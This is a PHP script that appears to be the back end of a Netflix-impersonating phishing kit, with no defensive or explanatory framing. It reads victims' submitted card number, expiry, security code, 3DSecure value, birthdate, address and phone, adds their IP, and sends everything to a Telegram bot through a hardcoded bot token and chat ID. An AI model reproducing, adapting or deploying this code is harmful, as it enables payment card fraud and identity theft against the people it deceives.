<?php

session_start();

include("system.php"); 
include("detect.php"); 

session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$config_token = "5405732055:AAG08gAxMewhSd_Bx7Tlvh-UrwdS2lJD9Ls";
$config_chat = "-716546387";

################

function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}

################

$_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$_SESSION['cardnumber'] = $_POST['cardnumber'];
$_SESSION['expdate'] = $_POST['expdate'];
$_SESSION['Securitycode'] = $_POST['Securitycode'];
$_SESSION['thDSecure'] = $_POST['thDSecure'];
$_SESSION['birthdate'] = $_POST['birthdate'];
$_SESSION['addres'] = $_POST['addres'];
$_SESSION['City'] = $_POST['City'];
$_SESSION['State'] = $_POST['State'];
$_SESSION['phoneNumber'] = $_POST['phoneNumber'];
$_SESSION['zipCod'] = $_POST['zipCod'];

################


$TELG.= urlencode("	✓ <b>Netflix</b> : ".$ip."\n\n");
$TELG.= urlencode("»<b> ".$_SESSION['cardnumber']." </b>\n");
$TELG.= urlencode("»<b> ".$_SESSION['expdate']." </b>\n");
$TELG.= urlencode("»<b> ".$_SESSION['Securitycode']." </b> \n\n");

$TELG.= urlencode("»<b> Name</b> : ".$_SESSION['NameOnCard']."\n");
$TELG.= urlencode("»<b> Birthdate</b> : ".$_SESSION['birthdate']."\n");
$TELG.= urlencode("»<b> addres</b> : ".$_SESSION['addres']."\n");
$TELG.= urlencode("»<b> City</b> : ".$_SESSION['City']."\n");
$TELG.= urlencode("»<b> State</b> : ".$_SESSION['State']."\n");
$TELG.= urlencode("»<b> zipCod</b> : ".$_SESSION['zipCod']."\n");
$TELG.= urlencode("»<b> phone</b> : ".$_SESSION['phoneNumber']."\n\n");

################

callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');

################

?>


